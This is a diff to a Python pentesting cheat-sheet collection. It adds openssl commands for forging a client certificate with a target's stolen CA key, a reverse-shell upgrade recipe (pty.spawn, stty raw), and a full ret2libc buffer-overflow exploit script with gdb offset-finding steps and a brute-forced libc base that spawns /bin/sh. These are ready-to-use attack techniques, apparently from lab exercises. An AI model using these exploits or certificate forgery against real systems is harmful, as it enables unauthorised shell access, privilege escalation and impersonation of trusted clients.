@@ -1372,7 +1372,7 @@ sudo chisel server -p 8008 --reverse   # port 8008 is the port of the chisel ser
 ######################################
 ######################################
 
-jwt_openssl = Cheat("JWT - openssl | get certificate via openssl")
+jwt_openssl = Cheat("JWT - openssl | get certificate via openssl | self-signed certificate")
 jwt_openssl.category = "Web"
 jwt_openssl.subCategory = "Cookie"
 jwt_openssl.output = """[*] Generate privKey to manipulate JWT token
@@ -1382,6 +1382,18 @@ openssl genrsa -out privKey.key 2048
 [*] Get certificate of a website
 
 openssl s_client -connect 10.10.10.162:443
+
+[*] Create and trust self-signed certificate (With private ca.key of the target machine)
+# Save public cerifications of the website
+openssl s_client -connect 10.10.10.131:443 | openssl x509 > ca.cer
+
+# With ca.cer and ca.key, create the client key and certificate
+openssl genrsa -out client.key 4096
+openssl req -new -key client.key -out client.req
+openssl x509 -req -in client.req -set_serial 123 -CA ca.cer -CAkey ca.key -days 365 -extensions client -outform PEM -out client.cer
+
+# Create the certificate for browser
+openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
 """
 
 ######################################
@@ -1897,4 +1909,101 @@ server.quit()
 
 time.sleep(4)
 os.system("/etc/init.d/sendmail stop")
+"""
+
+######################################
+######################################
+
+jaula = Cheat("Sair da Jaula! Upgrade e estabilizar o shell")
+jaula.category = "Linux"
+jaula.subCategory = "Reverse Shell"
+jaula.output = """[*] Sair da Jaula! Upgrade e estabilizar o shell
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'  # OR
+/usr/bin/script -qc /bin/bash /dev/null         # OR
+script /dev/null -c bash
+export TERM=xterm
+export SHELL=bash
+
+# Ctrl + Z
+stty raw -echo; fg; reset
+stty rows 40 columns 170
+"""
+
+######################################
+######################################
+
+ret2libc = Cheat("ret2libc attack - BOF - Binary exploit - Linux")
+ret2libc.category = "Linux"
+ret2libc.subCategory = "Reverse Engineering"
+ret2libc.output = """[*] ret2libc (return to libc, or return to the C library) attack
+
+# Get offset with gdb
+gdb ./binary.elf
+
+gef> run $(python -c 'print("A"*100)')
+get> pattern create 100
+	[+] Generating a pattern of 100 bytes (n=4)
+	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+	[+] Saved as '$_gef0'
+gef> run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+gef> pattern offset $eip
+	[+] Searching for '$eip'
+	[+] Found at offset 52 (little-endian search) likely
+	[+] Found at offset 49 (big-endian search)
+
+# check if we really control the EIP address
+gef> run $(python -c 'print("A" * 52 + "BBBB")')
+
+
+# Python Script
+from struct import pack
+import os, sys
+
+
+def getLibcAddr():
+	return int(os.popen("ldd /home/ayush/.binary/rop | grep libc | awk 'NF{print$NF}' | tr -d '()'").read().strip(), 16)
+
+def getSystemAddrOff():
+	return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' system@@' | awk '{print$2}'").read().strip(), 16)
+
+def getExitAddrOff():
+	return int(os.popen("readelf -s /lib/i386-linux-gnu/libc.so.6 | grep ' exit@@' | awk '{print$2}'").read().strip(), 16)
+
+def getBinShAddrOff():
+	return int(os.popen("strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh' | awk '{print$1}'").read().strip(), 16)
+
+def mostFrequent(List):
+	detailed_dict = {}
+	count = 0
+	mostFrequentItem = ''
+	for item in List:
+		detailed_dict[item] = detailed_dict.get(item, 0) + 1
+		if detailed_dict[item] >= count:
+			count = detailed_dict[item]
+			mostFrequentItem = item
+	return(mostFrequentItem)
+
+def p32(num):
+	return pack("<I",num)
+
+
+baseLibc = mostFrequent([getLibcAddr() for i in range(1000)])
+
+systemAddr = baseLibc + getSystemAddrOff()
+exitAddr = baseLibc + getExitAddrOff()
+binShAddr = baseLibc + getBinShAddrOff()
+
+offset = 52
+junk = b"A" * offset
+
+payload = junk
+payload += p32(systemAddr)
+payload += p32(exitAddr)
+payload += p32(binShAddr) 
+
+while True:
+	res = os.system(b"/home/ayush/.binary/rop " + payload)
+	if res == 0:
+		sys.exit(0)
 """
